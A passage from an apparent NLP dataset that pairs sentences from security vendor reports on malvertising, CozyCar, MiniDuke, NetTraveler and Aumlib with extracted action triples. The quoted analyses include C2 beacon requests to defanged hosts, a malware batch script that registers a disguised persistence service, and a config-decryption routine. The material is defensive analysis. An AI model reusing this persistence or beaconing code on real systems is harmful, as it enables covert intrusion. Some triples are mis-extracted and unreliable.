paying 65 cents to install a\nbackground web browser that does nothing but click fraud, the malvertiser is able to reap hundreds if not\nthousands of dollars in advertising referral income": [{"does": {"A": "does", "S": "a background web browser", "O": ["click fraud"]}}], " This exploit copied a fully\nfunctional version of Chrome into the Java cache directory, and that version of Chrome launched in the\nbackground and proceeded to visit websites and click on specific ad banners": [{"copied": {"A": "copied", "S": "This exploit", "O": ["a fully functional version of Chrome", "into the Java cache directory"]}}, {"click": {"A": "click", "S": "that version of Chrome", "O": ["on specific ad banners"]}}], "\n\nRansomware is a particularly pernicious form of malware that fully encrypts the victim\u2019s disk and data\nfiles, including remote storage, then demands payment of anywhere from $300 to $1000 in return for the\ndecryption key": [{"encrypts": {"A": "encrypts", "S": "Ransomware", "O": ["the victim\u2019s disk and data files, including remote storage"]}}], "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       2\n</header>\n\n<section>\n\n<heading>Executive Summary</heading>\n\nMost targeted attacks against organizations originate as spear-phish campaigns or watering hole style\nweb driveby attacks": [{"originate": {"A": "originate", "S": "Most targeted attacks against organizations", "O": ["as spear-phish campaigns or watering hole style web driveby attacks"]}}], " In this instance, the Pubmatic server redirected to a Web\nserver in Poland that dropped the malware": [{"dropped": {"A": "dropped", "S": "a Web server in Poland", "O": ["the malware"]}}], "                                                Release Date: 10.27.2014\n</footer>\n\f                                                                                    \n<header>\nInvincea White Paper       26\n</header>\n\n\n<section>\n<heading>Ransomware Campaign via Malvertising</heading>\n\nIn September and October of 2014, Invincea saw a sharp spike of malvertising delivering CryptoWall\nransomware attacks via Real Time Ad Bidding": [{"delivering": {"A": "delivering", "S": "malvertising", "O": ["via Real Time Ad Bidding", "CryptoWall ransomware attacks"]}}], " In each instance, the attacks were carried out by targeting these Defense\ncontractors directly via real-time ad bidding": [{"were carried out": {"A": "were carried out", "O": ["the attacks", "by targeting these Defense contractors directly via real-time ad bidding"]}}], " Merely visiting any ad-supported site may result in a CryptoWall ransomware infection": [{"result": {"A": "result", "S": "visiting any ad-supported site", "O": ["in a CryptoWall ransomware infection"]}}], " Figure 2 shows an event tree of\nthe exploit and malware delivered from an ad by visiting Fleaflicker.com": [{"delivered": {"A": "delivered", "O": ["by visiting Fleaflicker.com", "the exploit and malware", "from an ad"]}}], " A small fraction is malicious content linking\nto landing pages that infect users": [{"linking": {"A": "linking", "S": "malicious content", "O": ["to landing pages that infect users"]}}], "\n</section>\n<section>\n<heading>Operation DeathClick: Targeting the US Industrial Base</heading>\n\nRecently, multiple US Defense/Aerospace contractors were targeted by a malvertising campaign": [{"were targeted": {"A": "were targeted", "S": "a malvertising campaign", "O": ["multiple US Defense/Aerospace contractors"]}}], " We observed Real Time Ad bidding platforms, including\nOpenX, GoogleAds, Yahoo, AOL, and first-impression.com, fall victim to the ransomware malvertising\nscheme by unwittingly delivering the CryptoWall 2.0 ransomware ads": [{"delivering": {"A": "delivering", "S": "Real Time Ad bidding platforms, including OpenX, GoogleAds, Yahoo, AOL, and first-impression.com", "O": ["the CryptoWall 2.0 ransomware ads"]}}], " So how do they get money to spend on\nthese malicious campaigns?\n\nInvincea recently saw a malvertiser win a bid and delivered a Java exploit": [{"delivered": {"A": "delivered", "S": "a malvertiser", "O": ["a Java exploit"]}}], "\n\nCryptowall 2.0 utilizes the TOR network to hide its communications, but it quickly encrypts all local files\non the disk, and demands bitcoin payment to unlock the files": [{"encrypts": {"A": "encrypts", "S": "it", "O": ["all local files on the disk"]}}, {"utilizes": {"A": "utilizes", "S": "Cryptowall 2.0", "O": ["the TOR network", "to hide its communications"]}}], " Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-\nsupported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web\nexploits": [{"exploit": {"A": "exploit", "S": "the malicious ads", "O": ["unsuspecting visitors", "with rive-by web exploits"]}}, {"used": {"A": "used", "O": ["to distribute malware", "3rd party ad networks"]}}], " As we\nhave detailed here, they can also be mis-appropriated unwittingly by malvertisers using these same tools\nand techniques to target companies with malware for persistent remote access in addition to traditional\nclick fraud, phishing, and identity theft": [{"using": {"A": "using", "S": "malvertisers", "O": ["these same tools and techniques", "in addition to traditional click fraud, phishing, and identity theft", "to target companies with malware for persistent remote access"]}}], "                                                         Release Date: 10.27.2014\n</footer>\n\f                                                                                  \n<header>\nInvincea White Paper     29\n</header>\n\n\nIn addition, you can see the ransom note being written to disk on an infected machine in the audit logs\nin Figure 24": [{"being written": {"A": "being written", "O": ["to disk", "the ransom note", "on an infected machine"]}}], "\n\nTraditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to\ncompromise endpoints to perpetrate ad fraud, identity fraud, and banking credential theft": [{"perpetrate": {"A": "perpetrate", "S": "cyber crime gangs", "O": ["ad fraud"]}}], "\n</section>\n\n<section>\n<heading>Real-Time Bidding Networks: How it works</heading>\n\nWe observed in Operation DeathClick that real-time ad bidding networks are being used by criminal\nenterprise to target companies with malicious content in order to gain persistent remote access": [{"being used": {"A": "being used", "S": "criminal enterprise", "O": ["to target companies with malicious content", "real-time ad bidding networks"]}, "gain": {"A": "gain", "S": "criminal enterprise", "O": ["persistent remote access"]}}], " But it is very simple to replace the redirection code\nto switch from a legitimate ad banner to a drop site that hosts an exploit kit, typically based on Java, Flash,\nSilverlight, or all three": [{"replace": {"A": "replace", "O": ["the redirection code", "to switch from a legitimate ad banner to a drop site that hosts an exploit kit, typically based on Java, Flash, Silverlight, or all three"]}}], "\nBut the malware delivery could have been intended for data exfiltration, banking Trojans, or any other\nmore insidious purpose": [{"been intended": {"A": "been intended", "O": ["for data exfiltration", "the malware delivery"]}}], "\n\nIn the campaign described here, Operation DeathClick, traditional malvertising has been armed with a\nmicro-targeting system using IP address ranges, geographically narrowed down to zip codes, and interests\nof the user (recorded in cookies) to target specific companies, company types, and user\ninterests/preferences": [{"been armed": {"A": "been armed", "O": ["with a micro-targeting system using IP address ranges, geographically narrowed down to zip codes, and interests of the user (recorded in cookies)", "to target specific companies, company types, and user interests/preferences", "traditional malvertising"]}}], " But what if the landing pages that are\nsupposed to be ads are actually malicious PHP pages with embedded malware? The bidding and ad\nplacements work the same, but instead of seeing a flashy ad banner, the highest bidder for the placement\nserves malware": [{"serves": {"A": "serves", "S": "the highest bidder for the placement", "O": ["malware"]}}], " And now, with the advent of real-time ad bidding, these threat actors have\nweaponized ad delivery networks to target victims based on:\n<list>\n    \uf0b7   User-Agent strings (versions of flash, OS, java and browser)\n    \uf0b7   Interest-related content (click bait articles, industry specific software or hardware, like medical\n        supplies, radar mapping software, ammunition sales, stocks forums)\n    \uf0b7   Advertising Profiles derived from cookies (someone with specific tastes, may shop for shoes,\n        handbags, cars, luxury vacations)\n    \uf0b7   Geographic region (malvertisers can target specific neighborhoods or states via geoip direct\n        advertising)\n    \uf0b7   Specific corporate IP ranges (targeted malvertising can target the public IP space of your network\n        or an Industrial Vertical)\n</list>\n\n\n\n<footer>\nInvincea, Inc": [{"weaponized": {"A": "weaponized", "S": "these threat actors", "O": ["to target victims", "ad delivery networks"]}}], "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       10\n</header>\n\n<figure></figure>\n\n\n                                   <caption>Figure 7: Event Tree for Gpokr.com</caption>\n\nThis event on September 14 (Figure 8) shows that delivery.first-impression.com redirected directly to an\nIP address, not a domain name to deliver its malicious payload": [{"redirected": {"A": "redirected", "S": "delivery.first-impression.com", "O": ["to an IP address, not a domain name", "to deliver its malicious payload"]}}], " The timeline will show that when the user replied to an email, the ads\non the Earthlink page refreshed, dropping the exploit code via Java": [{"dropping": {"A": "dropping", "S": "the ads on the Earthlink page", "O": ["the exploit code", "via Java"]}}], " Those ad windows can and\nare being used to deliver malware if the bidding price is right": [{"being used": {"A": "being used", "O": ["if the bidding price is right", "Those ad windows", "to deliver malware"]}}], "\n\nBut in a two week period, these organizations were hit with dozens of micro-targeted malvertising attacks,\neach of which would have provided a beachhead for the threat actors from which to compromise the\nnetwork, if successful": [{"were hit": {"A": "were hit", "O": ["these organizations", "with dozens of micro-targeted malvertising attacks"]}}], "\n\nBased on analysis of Invincea logs in would-be victims targeted by these ads, we have insight into the\nattacker that is delivering the malicious ads": [{"is delivering": {"A": "is delivering", "S": "the attacker", "O": ["the malicious ads"]}}], " The event tree in Figure 10 notes that\nthis was likely a spear-phish attack": [{"was": {"A": "was", "S": "this", "O": ["a spear-phish attack"]}}], " When they replied to an email,\na new ad was loaded on a page that attempted to exploit Java": [{"exploit": {"A": "exploit", "S": "a new ad", "O": ["Java"]}}], " Most of the attacks featured here were not\ndetected by standard Anti-Virus because the malware hashes constantly change": [{"were not detected": {"A": "were not detected", "S": "standard Anti-Virus", "O": ["Most of the attacks featured here", "because the malware hashes constantly change"]}}], " The malware delivered came from a compromised Polish website, and\nwould have installed a generic backdoor Trojan": [{"installed": {"A": "installed", "S": "The malware", "O": ["a generic backdoor Trojan"]}}], " Since these attacks were blocked by Invincea prior to compromise of the machine\nor network, we cannot confirm the specific IP the perpetrators are after \u2013 only the Tactics, Techniques,\nand Protocols (TTPs) used which we describe herein, similar to methods used to provide backdoor access\nand command and control over compromised networks": [{"provide": {"A": "provide", "S": "methods", "O": ["backdoor access and command and control over compromised networks"]}}], " Unfortunately, the micro-targeting malvertising technique evades almost all\nnetwork controls and traditional endpoint anti-virus solutions": [{"evades": {"A": "evades", "S": "the micro-targeting malvertising technique", "O": ["almost all network controls and traditional endpoint anti-virus solutions"]}}], "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       6\n</header>\n\n\n<figure></figure>\n\n                     <caption>Figure 2: Event tree for infection from Fleaflicker.com Incident</caption>\n\nThe event tree in Figure 2 taken from Invincea\u2019s Threat Management Console shows the exploited Java\nprocess dropped a file called fvJcrgR0.exe, and that it likely came from Pubmatic, an ad delivery network\nthat allows for real time bidding to deliver ads": [{"dropped": {"A": "dropped", "S": "the exploited Java process", "O": ["a file called fvJcrgR0.exe"]}}], "                                                             Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       23\n</header>\n\n\n    \uf0b7   Unconfigured Apache hosts\n    \uf0b7   Cloud-based NGINX subdirectories\n    \uf0b7   Government and News pages in Poland\n    \uf0b7   Free Hosting sites such as ua.in\n</list>\nIn most instances, the landing pages are preconfigured with the exploit kit": [{"are preconfigured": {"A": "are preconfigured", "O": ["the landing pages", "with the exploit kit"]}}], "\n</section>\n<section>\n<heading>Real World Examples of RTB Malvertising Captured by Invincea</heading>\n\nFigures 17 through 21 in the following are screenshots from Invincea\u2019s Threat Management console from\nvarious RTB-based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad\nbidding": [{"delivered": {"A": "delivered", "O": ["via RTB ad bidding", "malvertising"]}}], " </caption>\n\nAnalysis of the secondary dll file (name matches [A-Z0-9]{1}\\.tmp) indicates that its primary function is\nto serve as a cleanup mechanism for the dropped binary": [{"serve": {"A": "serve", "S": "the secondary dll file", "O": ["as a cleanup mechanism for the dropped binary"]}}], " [2]\n\nThis campaign, which began on July 7, 2015, appears to be targeted at government organizations and\nthink-tanks located in democratic countries [3], and utilizes compromised, legitimate websites for spear\nphishing and command and control activity": [{"utilizes": {"A": "utilizes", "O": ["compromised, legitimate websites", "for spear phishing"]}}], "\n\nGET /webscriptsecurity/view/4/player.swf HTTP/1.1\n     Accept: text/html,application/xhtml+xml,*/*\n     Accept-Language: en_US\n     User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\n     Host: extranet.qualityplanning[.]com\n     Connection: Keep-Alive\n\n\n\n\n   GET /webscriptsecurity/view/4/player.swf HTTP/1.1\n\f       Accept: text/html,application/xhtml+xml,*/*\n\n       Accept-Language: en_US\n\n     User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET\n   CLR 2.0.50727)\n\n       Host: extranet.qualityplanning[.]com\n\n       Connection: Keep-Alive\n\n\n\nThe secondary dropper then cleans up after itself with a simple vbs script\n(md5:0d132ee171768dc30d14590ed2dbadd1) that leaves only the decoy multimedia file behind": [{"cleans up": {"A": "cleans up", "S": "The secondary dropper", "O": ["after itself", "with a simple vbs script"]}}], "\n</section>\n\n<section>\n<heading> Command handler </heading>\n\nOnce the C2 and Trojan have synchronized and can decrypt their network communications the C2 server\nwill begin responding to beacons from the Trojan with JSON blobs": [{"responding": {"A": "responding", "S": "the C2 server", "O": ["with JSON blobs", "to beacons from the Trojan"]}}], " To obtain tasks, the Trojan will issue an HTTPS request to the C2 server\n(\u201chost_scripts\u201d in the configuration) that resembles the following example beacon:\n\nGET /mobile/viewer.php HTTP/1.1\nAccept: */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: www.illuminatistudios[.]net\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\n\n\n\n\n   GET /mobile/viewer.php HTTP/1.1\n\n   Accept: */*\n\n   Accept-Language: en-US\n\f   User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\n\n   Host: www.illuminatistudios[.]net\n\n   Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\n\n   Accept-Encoding: gzip, deflate\n\n   Connection: Keep-Alive\n\nThe Trojan manually creates the cookie in this HTTP request": [{"issue": {"A": "issue", "S": "the Trojan", "O": ["an HTTPS request", "to the C2 server"]}}], "\n\nUnit 42 analyzed the Trojan\u2019s command handler and found several commands, as seen in Table 2, which\nallows the threat actors to carry out a full range of activities on the system": [{"allows": {"A": "allows", "O": ["to carry out a full range of activities on the system", "the threat actors"]}}], "\n</section>\n\n<section>\n<heading> Malware Details </heading>\n\n<heading> The Initial Droppers: Decoy and Downloader </heading>\n\nThe current CozyCar campaign includes spear phishing emails that deliver the payload from either by a\nlink to a .zip file on a compromised website or by direct delivery as an attachment to the phish": [{"includes": {"A": "includes", "S": "The current CozyCar campaign", "O": ["spear phishing emails that deliver the payload from either by a link to a .zip file on a compromised website or by direct delivery as an attachment to the phish"]}}], "\n\f\n<figure></figure>\nAs the next step, MiniDuke gathers the following information from the infected systems:\n<list>\n      computer name and user domain name\n      country code of the infected host IP address obtained from http://www.geoiptool.com\n      OS version information\n      domain controller name, user name, groups a user account belongs to\n      a list of AV products installed onto the system\n      Internet proxy configuration\n      version of MiniDuke\n</list>\nThis information is then sent to the C&C server along with the request to download a payload": [{"gathers": {"A": "gathers", "S": "MiniDuke", "O": ["from the infected systems", "the following information"]}}, {"is then sent": {"A": "is then sent", "O": ["to the C&C server", "This information"]}}, {"request": {"A": "request", "O": ["to download a payload"]}}], " The name of the .LNK file is randomly drawn from the\n\ffollowing values:\n\n<figure></figure>\n\n\nThe .LNKfile is created using a COM object with the IShellLinkA interface and contains the following\ncommand: \u201cC:\\Windows\\system32\\rundll32.exe %path_to_main_module%, export_function\u201d Which\ngives something like:\n\u201cC:\\Windows\\system32\\rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\APPLIC~1\\data.cat, IlqUenn\u201c": [{"is created": {"A": "is created", "O": ["The .LNKfile", "with the IShellLinkA interface", "using a COM object"]}}], " The information collected on\ninfection has not changed since the previous version and consists of the following values:\n<list>\n      volume serial number (obtained from kernel32!GetVolumeInformationA)\n      CPU information (obtained with the cpuidinstruction)\n      computer name (obtained from kernel32!GetComputerNameA)\n</list>\nOnce the encrypted version of the malware is created, it is written into a file in the\n%ALLUSERSPROFILE%\\Application Data directory": [{"is created": {"A": "is created", "O": ["the encrypted version of the malware"]}}, {"is written": {"A": "is written", "O": ["into a file in the %ALLUSERSPROFILE%\\Application Data directory", "it"]}}], "\n\nThe functionality of the shellcode which is executed by triggering the vulnerability is rather simple and\nstraightforward": [{"is executed": {"A": "is executed", "O": ["by triggering the vulnerability", "the shellcode"]}}], "\n\n<figure></figure>\n\n\n<caption>Result of first obfuscation</caption>\n\n\n<figure></figure>\n\n<caption>Result of second obfuscation</caption>\n\nThe purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute": [{"retrieve": {"A": "retrieve", "S": "this script", "O": ["JScript code to execute"]}, "use": {"A": "use", "S": "this script", "O": ["to find a C&C", "Twitter"]}}], "\n\n<figure></figure>\n\n\nPrior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of\n\ftwo separate obfuscations, we can see that the variables have different values": [{"applies": {"A": "applies", "S": "MiniDuke", "O": ["to the script", "a light encoding"]}}], " We have since seen multiple cases where this exploit is\nused to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke\n(also known as Win32/SandyEva)": [{"deliver": {"A": "deliver", "S": "this exploit", "O": ["malware"]}}], " If the configuration data is\ndecrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by\nwhich to reach C&C server": [{"retrieves": {"A": "retrieves", "S": "MiniDuke", "O": ["the Twitter page of @FloydLSchwartz", "in search of URLs by which to reach C&C server"]}}], " The name of the file is randomly picked from the\nfollowing values (you can find this listing and those of the next screenshots on the VirusRadar description:\n\n<figure></figure>\n\n\nThe filename extension is also picked randomly from the following list:\n\n<figure></figure>\n\n\nTo persist on the infected system after reboots, the malware creates a hidden .LNK file in the \u201cStartup\u201d\ndirectory pointing to the modified main module": [{"creates": {"A": "creates", "S": "the malware", "O": ["in the \u201cStartup\u201d directory", "a hidden .LNK file"]}, "persist": {"A": "persist", "S": "the malware", "O": ["on the infected system", "after reboots"]}}], "\n</section>\n<section>\n<heading>Operation</heading>\n\nWhen the malware is loaded by rundll32.exe and the current directory isn\u2019t %TEMP%, the malware starts\nwith gathering the same system information as described in the \u201cInstallation\u201d section to decrypt\nconfiguration information": [{"gathering": {"A": "gathering", "S": "the malware", "O": ["the same system information as described in the \u201cInstallation\u201d section", "to decrypt configuration information"]}}, {"is loaded": {"A": "is loaded", "S": "rundll32.exe", "O": ["the malware"]}}], "\n</section>\n<section>\n<heading>TwitterJS component</heading>\n\fThe TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of\ncode into it and redirecting the exported functions to this code": [{"creating": {"A": "creating", "O": ["a copy of the Windows DLL cryptdll.dll"]}}], " Below you can find the content of\nthe init.cmd script used by MiniDuke to install TwitterJS module onto the system": [{"install": {"A": "install", "S": "MiniDuke", "O": ["TwitterJS module", "onto the system"]}}], " Some\nof the characteristics of MiniDuke \u2014 such as its small size (20 KB), its crafty use of assembly\nprogramming, and the use of zero-day exploits for distribution \u2014 made it an intriguing threat": [{"use": {"A": "use", "S": "MiniDuke", "O": ["for distribution", "zero-day exploits"]}}], " The malware processes the\ndownloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using\nRSA-2048, then decrypts it, stores in a file and finally executes it": [{"executes": {"A": "executes", "S": "it", "O": ["it"]}, "verifies": {"A": "verifies", "S": "it", "O": ["using RSA-2048", "the integrity of the file"]}}], " Finally this DLL is registered as the Open command when a drive is open, which has the effect of\nstarting the bot every time the user opens a disk drive": [{"starting": {"A": "starting", "O": ["every time the user opens a disk drive", "the bot"]}}, {"is registered": {"A": "is registered", "O": ["as the Open command when a drive is open", "this DLL"]}}], " The end result is that it is impossible to retrieve the\nconfiguration of an encrypted payload if analyzing it on a different computer": [{"impossible to retrieve": {"A": "impossible to retrieve", "O": ["if analyzing it on a different computer", "the configuration of an encrypted payload"]}}], "\n\nAn interesting thing about the shellcode is that before transferring control to any API function it checks\nthe first bytes of the function in order to detect hooks and debugger breakpoints which may be set by\nsecurity software and monitoring tools": [{"detect": {"A": "detect", "S": "it", "O": ["hooks and debugger breakpoints which may be set by security software and monitoring tools"]}}], " If either of those conditions is met the malware assumes it is run for the\nfirst time and it proceeds with its installation onto the system": [{"proceeds": {"A": "proceeds", "S": "it", "O": ["with its installation onto the system"]}}], " The final\nURL used to communicate with the C&C server looks like this: <url_start>/create.php?<rnd_param>=\n<system_info> Those tokens are derived as follows:\n<list>\n      url_start \u2013 the URL retrieved from the twitter account\n      rnd_param \u2013 randomly generated of lower case alphabet characters parameter name in the query\n\f      string of the URL\n      system_info \u2013 base64 encoded and encrypted system information\n</list>\nAn example of such a URL is given below:\n<figure></figure>\n\nThe payload is downloaded in the file named \u201cfdbywu\u201d using the urlmon!URLDownloadToFileA API:\n\n<figure></figure>\n\n\nThe downloaded payload is a fake GIF8 file containing encrypted executable": [{"used": {"A": "used", "O": ["to communicate with the C&C server", "The final URL"]}}, {"is downloaded": {"A": "is downloaded", "O": ["in the file named \u201cfdbywu\u201d", "using the urlmon!URLDownloadToFileA API", "The payload"]}}], " MiniDuke gathers information about the\nsystem and encrypts its configuration based on that information, a method also used by OSX/Flashback\n(this process is called watermarking by Bitdefender)": [{"gathers": {"A": "gathers", "S": "MiniDuke", "O": ["information about the system"]}, "encrypts": {"A": "encrypts", "S": "MiniDuke", "O": ["its configuration", "based on that information"]}}], "\n\n<figure></figure>\n\n\nThis file is then stored in an Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE%\nfolder": [{"is then stored": {"A": "is then stored", "S": "This file", "O": ["in an Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE% folder"]}}], " This is probably done to\nthwart security systems that scan at the entry points of the JScript engine": [{"thwart": {"A": "thwart", "S": "This", "O": ["security systems that scan at the entry points of the JScript engine"]}}], " After decrypting itself and obtaining the addresses of some functions exported by\nkernel32.dll, it decrypts and drops the payload in the %TEMP% directory in a file named \u201ca.l\u201d which is\nsubsequently loaded by calling kernel32!LoadLibraryA": [{"decrypts and drops": {"A": "decrypts and drops", "S": "it", "O": ["the payload", "in the %TEMP% directory in a file named \u201ca.l\u201d"]}, "is subsequently loaded": {"A": "is subsequently loaded", "O": ["the payload", "by calling kernel32!LoadLibraryA"]}}], " The RSA-2048 public key to verify\nintegrity of the executable inside the GIF file is the same as in the previous version of MiniDuke": [{"verify": {"A": "verify", "S": "The RSA-2048 public key", "O": ["integrity of the executable inside the GIF file"]}}], " Although\nthe backdoor is still quite similar to its previous versions, some important changes were made since last\nyear, the most notable being the introduction of a secondary component written in JScript to contact a\nC&C server via Twitter": [{"contact": {"A": "contact", "S": "a secondary component written in JScript", "O": ["a C&C server", "via Twitter"]}}], " Other known mutexes used by older and current variants include:\n<list>\n Boat-12 Is Running!\n DocHunter2012 Is Running!\n Hunter-2012 Is Running!\n NT-2012 Is Running!\n\f      NetTravler Is Running!\n      NetTravler2012 Is Running!\n      SH-2011 Is Running!\n      ShengHai Is Running!\n      SD2013 is Running!\n</list>\nThe malware configuration file is written to the \"SYSTEM\" folder (as opposed to SYSTEM32) and has a\nslightly new format compared to \"older\" NetTraveler samples:\n\n\n<figure></figure>\n\nFor the record, here's what an older NetTraveler config file looks like:\n\n<figure></figure>\n\n\nObviously, the developers behind NetTraveler have taken steps to try to hide the malware's configuration": [{"hide": {"A": "hide", "S": "the developers behind NetTraveler", "O": ["the malware's configuration"]}}, {"is written": {"A": "is written", "O": ["The malware configuration file", "to the \"SYSTEM\" folder (as opposed to SYSTEM32)"]}}], "\n\nIf run on a vulnerable version of Microsoft Office, it drops the main module as \"net.exe\" (detected by\nKaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr), which in turn installs a number of\nother files": [{"installs": {"A": "installs", "S": "the main module", "O": ["a number of other files"]}}, {"drops": {"A": "drops", "S": "it", "O": ["as \"net.exe\"", "the main module"]}}], "\n\nThe algorithm is as follows:\n<code>\nfor (i=0;i<string_size;i++)\ndecrypted[i]=encrypted[i] - (i + 0xa);\n</code>\nOnce decrypted, the new config looks like this:\n\n<figure></figure>\n\fOne can easily see the command-and-control (C&C) server in the screenshot above, which is\n\"uyghurinfo[.]com\"": [{"is": {"A": "is", "S": "the command-and-control (C&C) server", "O": ["\"uyghurinfo[.]com\""]}}], "\n\nHere's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014": [{"directed": {"A": "directed", "O": ["at Uyghur activists", "in March 2014", "a targeted spear-phishing e-mail"]}}], "\n\n\n<figure></figure>\n\nThe e-mail has two attachments, a non-malicious JPG file and a 373 KB Microsoft Word .DOC file": [{"has": {"A": "has", "S": "The e-mail", "O": ["two attachments, a non-malicious JPG file and a 373 KB Microsoft Word .DOC file"]}}], "\n<table>\n           Name                      WINDOWSUPDATANEY.DLL\n           MD5                       c13c79ad874215cfec8d318468e3d116\n           Size                      37,888 bytes\n</table>\nIt is registered as a service (named \"Windowsupdata\") through a Windows Batch file named \"DOT.BAT\"\n(detected by Kaspersky Lab products as Trojan.BAT.Tiny.b):\n<figure>\n @echo off\n @reg add\n</figure>\n<figure>\n @echo off\n\n @reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v\n Windowsupdata /t REG_MULTI_SZ /d Windowsupdata /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n ImagePath /t REG_EXPAND_SZ /d %SystemRoot%\\System32\\svchost.exe -k Windowsupdata /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n DisplayName /t REG_SZ /d Windowsupdata /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n ObjectName /t REG_SZ /d LocalSystem /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n ErrorControl /t REG_DWORD /d 1 /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v Start /t\n REG_DWORD /d 2 /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\\Parameters\"\n /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\\system32\\Windowsupdataney.dll /f\n</figure>\nTo   make sure the malware isn't running multiple times, it uses the mutex \"SD_2013 Is Running!\" to mark\nits presence in the system": [{"is registered": {"A": "is registered", "O": ["as a service (named \"Windowsupdata\")", "It", "through a Windows Batch file named \"DOT.BAT\""]}}, {"make": {"A": "make", "O": ["the malware isn't running multiple times", "sure"]}}], " The main C&C module is dumped into\n\"%SystemRoot%\\system32\\Windowsupdataney.dll\", (detected by Kaspersky as Trojan-\nSpy.Win32.TravNet.qfr)": [{"is dumped": {"A": "is dumped", "O": ["into \"%SystemRoot%\\system32\\Windowsupdataney.dll\"", "The main C&C module"]}}], "\n\n<figure></figure>\n\n\nThe Base64-encoded data still contains information including the victim\u2019s hostname and IP address but\nalso a \u201cmark\u201d or \u201ccampaign tag/code\u201d that the threat actors use to keep track of their various attacks": [{"contains": {"A": "contains", "S": "The Base64-encoded data", "O": ["information including the victim\u2019s hostname and IP address"]}}], "\n\f\n\n<figure></figure>\n\nThis sample (aa873ed803ca800ce92a39d9a683c644) exhibited network traffic that does not match the\nearlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe\nrelated infections": [{"evade": {"A": "evade", "S": "This sample (aa873ed803ca800ce92a39d9a683c644)", "O": ["existing network traffic signatures designed to detect Ixeshe related infections"]}}], " Older variants of this malware family generated the\nfollowing POST request:\n<list>\nPOST /bbs/info.asp HTTP/1.1\n</list>\nData sent via this POST request transmitted in clear text in the following structure:\n<list>\n<VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|\n</list>\nA recently observed malware sample (hash value 832f5e01be536da71d5b3f7e41938cfb) appears to be a\nmodified variant of Aumlib": [{"sent": {"A": "sent", "O": ["Data", "via this POST request"]}}, {"generated": {"A": "generated", "S": "Older variants of this malware family", "O": ["the following POST request"]}}], "\n\nAnd a new version of Ixeshe, which has been in service since 2009 to attack targets in East Asia, uses new\nnetwork traffic patterns, possibly to evade traditional network security systems": [{"uses": {"A": "uses", "S": "a new version of Ixeshe", "O": ["to evade traditional network security systems", "new network traffic patterns"]}}], "\n\nAumlib, which for years has been used in targeted attacks, now encodes certain HTTP communications": [{"encodes": {"A": "encodes", "S": "Aumlib", "O": ["certain HTTP communications"]}}], " The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to\ndocuments[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a\nPOST request to /bbs/info.asp": [{"connected": {"A": "connected", "S": "The sample cb3dcde34fd9ff0e19381d99b02f9692", "O": ["to documents[.]myPicture[.]info and www[.]documents[.]myPicture[.]info"]}, "generated": {"A": "generated", "S": "The sample cb3dcde34fd9ff0e19381d99b02f9692", "O": ["a POST request", "to /bbs/info.asp"]}}], " About four months after The New York Times\npublicized an attack on its network, the attackers behind the intrusion deployed updated versions of their\nBackdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families <fn>[2]</fn>": [{"deployed": {"A": "deployed", "S": "the attackers behind the intrusion", "O": ["updated versions of their Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families"]}}], "\n\nThe sample, which was deployed against an organization involved in shaping economic policy, was\ndownloaded from the following URL:\n<list>\nstatus[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css\n</list>\nThe sample generated the following traffic:\n\n<figure></figure>\n\nThis output reveals the following changes when compared with earlier variants:\n\n      The POST URI is changed to /bbs/search.asp (as mentioned, earlier Aumlib variants used a POST\n\f      URI of /bbs/info.asp.)\n      The POST body is now encoded": [{"is now encoded": {"A": "is now encoded", 